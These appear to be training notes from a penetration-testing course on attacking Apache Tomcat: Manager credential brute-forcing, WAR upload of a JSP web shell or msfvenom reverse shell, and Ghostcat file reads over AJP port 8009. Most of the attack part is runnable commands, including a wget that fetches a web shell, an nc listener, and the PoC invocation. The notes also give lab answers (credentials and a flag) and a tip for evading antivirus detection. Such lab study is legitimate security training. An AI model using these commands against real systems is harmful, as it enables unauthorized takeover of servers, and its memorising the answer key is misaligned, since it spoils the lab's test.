# Section 10 — Attacking Tomcat

## ID
901

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 10 — Attacking Tomcat

## Description
Covers brute-forcing Tomcat Manager credentials via Metasploit and custom scripts, achieving RCE through WAR file upload (manual JSP web shell and msfvenom reverse shell), and exploiting CVE-2020-1938 (Ghostcat) for unauthenticated LFI via AJP on port 8009.

## Tags
tomcat, brute-force, war-upload, rce, ghostcat, metasploit

## Commands
- `msfconsole -q`
- `use auxiliary/scanner/http/tomcat_mgr_login`
- `set VHOST web01.inlanefreight.local`
- `set RPORT 8180`
- `set STOP_ON_SUCCESS true`
- `set PROXIES HTTP:127.0.0.1:8080`
- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o backup.war`
- `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp && zip -r backup.war cmd.jsp`
- `curl http://<TARGET>:<PORT>/backup/cmd.jsp?cmd=id`
- `nmap -sV -p 8009,8080 <TARGET>`
- `python2.7 tomcat-ajp.lfi.py <TARGET> -p 8009 -f WEB-INF/web.xml`

## What This Section Covers
Once a Tomcat instance is discovered and fingerprinted, the next step is gaining access — typically by brute-forcing the `/manager/html` login and then uploading a malicious WAR file for RCE. This section walks through three attack paths: Metasploit-based credential brute forcing, manual WAR file upload with a JSP web shell, and the Ghostcat (CVE-2020-1938) LFI vulnerability on AJP port 8009. It also covers debugging Metasploit modules through Burp Suite proxy and operational security practices for web shell deployment.

## Methodology

### Phase 1 — Brute-Force Tomcat Manager Credentials

1. Add vHost to `/etc/hosts`: `echo "<STMIP> web01.inlanefreight.local" | sudo tee -a /etc/hosts`.
2. Launch Metasploit and load the Tomcat login scanner: `use auxiliary/scanner/http/tomcat_mgr_login`.
3. Configure the module — set `RHOSTS`, `RPORT 8180`, `VHOST web01.inlanefreight.local`, and `STOP_ON_SUCCESS true`.
4. The module uses three built-in wordlists by default (located under `/usr/share/metasploit-framework/data/wordlists/`): `tomcat_mgr_default_users.txt`, `tomcat_mgr_default_pass.txt`, and `tomcat_mgr_default_userpass.txt` (user:pass combos).
5. Run the module. Tomcat Manager uses HTTP Basic Authentication — each credential pair is Base64-encoded in the `Authorization` header. You can verify this by decoding: `echo <BASE64_STRING> | base64 -d`.
6. If the module behaves unexpectedly, proxy its traffic through Burp for debugging: `set PROXIES HTTP:127.0.0.1:8080` — this lets you inspect the exact requests in Burp's HTTP History to confirm the scanner is correctly encoding and submitting credentials.

**Alternative — Custom Python brute-forcer:** A simple Python script (`mgr_brute.py`) can do the same thing using the `requests` library with HTTP Basic Auth. Usage: `python3 mgr_brute.py -U http://<TARGET>:<PORT>/ -P /manager -u <USERS_FILE> -p <PASS_FILE>`. The script iterates user/password combos and checks for HTTP 200 (success) vs 401 (failure).

### Phase 2 — WAR File Upload for RCE

**Option A — Manual JSP web shell:**
1. Download a lightweight JSP command shell: `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp`.
2. Package it into a WAR: `zip -r backup.war cmd.jsp`.
3. Log into Tomcat Manager at `/manager/html` with the brute-forced credentials.
4. Scroll to "WAR file to deploy", click Browse, select `backup.war`, click Deploy.
5. The app appears in the applications table as `/backup`. Browse to `/backup/cmd.jsp` (not just `/backup/` — that gives a 404).
6. Execute commands via the web shell in-browser or with cURL: `curl http://<TARGET>:<PORT>/backup/cmd.jsp?cmd=id`.

**Option B — msfvenom reverse shell:**
1. Generate a WAR payload: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o backup.war`.
2. Deploy it the same way via the Manager GUI.
3. Start a listener: `nc -lnvp <LPORT>`.
4. Click on `/backup` in the Manager app list — the reverse shell connects back.

**Cleanup:** Click "Undeploy" next to the deployed app in the Manager GUI. This removes both the WAR file and the extracted directory from `webapps/`. Note the upload path for your report (e.g. `/opt/tomcat/apache-tomcat-10.0.10/webapps/`).

### Phase 3 — CVE-2020-1938 (Ghostcat) — Unauthenticated LFI via AJP

1. Scan for AJP on port 8009: `nmap -sV -p 8009,8080 <TARGET>`.
2. If AJP (Apache Jserv Protocol) is open, the target may be vulnerable to Ghostcat. This affects all Tomcat versions before 9.0.31, 8.5.51, and 7.0.100.
3. AJP is a binary protocol normally used for proxying requests from a front-end web server to Tomcat. The vulnerability is a misconfiguration that allows unauthenticated file reads.
4. Run the PoC: `python2.7 tomcat-ajp.lfi.py <TARGET> -p 8009 -f WEB-INF/web.xml`.
5. **Limitation:** Ghostcat can only read files within the `webapps/` directory — system files like `/etc/passwd` are out of scope. But `WEB-INF/web.xml` and other config files within webapps may contain sensitive data (credentials, servlet mappings, internal endpoints).

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Perform a login brute-forcing attack against Tomcat manager. What is the valid username? | tomcat | Metasploit `auxiliary/scanner/http/tomcat_mgr_login` with `RPORT 8180`, `VHOST web01.inlanefreight.local`, `STOP_ON_SUCCESS true` — successful login: `tomcat:root` |
| What is the password? | root | Same brute-force result above |
| Obtain RCE on the Tomcat instance. Find and submit the contents of tomcat_flag.txt | t0mcat_rc3_ftw! | Generate WAR with `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=9001 -f war -o backup.war`, deploy via Manager GUI at `/manager/html` using `tomcat:root`, start `nc -lnvp 9001`, click `/backup` to trigger shell, then `cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt` |

## Key Takeaways
- Tomcat Manager uses HTTP Basic Auth — credentials are simply Base64-encoded, not hashed. This makes brute forcing straightforward but also means creds travel in near-cleartext (always check for TLS).
- The default Metasploit wordlists for Tomcat are small and targeted — they contain the most common default/weak Tomcat credential pairs, not generic password lists. This makes the scan fast and low-noise.
- WAR file upload to RCE is the bread-and-butter Tomcat attack: if you have `manager-gui` creds, you own the box. Tomcat often runs as `root` or `SYSTEM`, so this can be an instant privileged foothold.
- The `multi/http/tomcat_mgr_upload` Metasploit module automates the full WAR-upload-to-shell chain if you want a one-shot approach.
- Ghostcat (CVE-2020-1938) is worth checking whenever you see AJP on port 8009 — it requires no credentials and can leak config files inside `webapps/`, but it's limited to that directory tree.
- Web shell OPSEC: use randomized filenames, restrict access by source IP, and consider password-protecting the shell. You don't want an attacker finding your web shell and leveraging it for their own access.
- The lightweight JSP web shell from the section is only flagged by 2/58 AV vendors — and a trivial string change (e.g. `"Uploaded:"` → `"uPlOaDeD:"`) drops it to 0/58.

## Gotchas
- The lab brute-force finds `tomcat:root` — this differs from the walkthrough example in the reading material which shows `tomcat:admin`. The actual lab answer is `root`.
- After deploying a WAR file, you must browse to `/backup/cmd.jsp` (the specific JSP file), not just `/backup/` — the latter returns a 404.
- The Ghostcat PoC requires Python 2.7 specifically (`python2.7 tomcat-ajp.lfi.py`), not Python 3.
- When proxying Metasploit through Burp, make sure Burp is already running before you set `PROXIES` and hit `run` — otherwise the module will fail with connection errors.
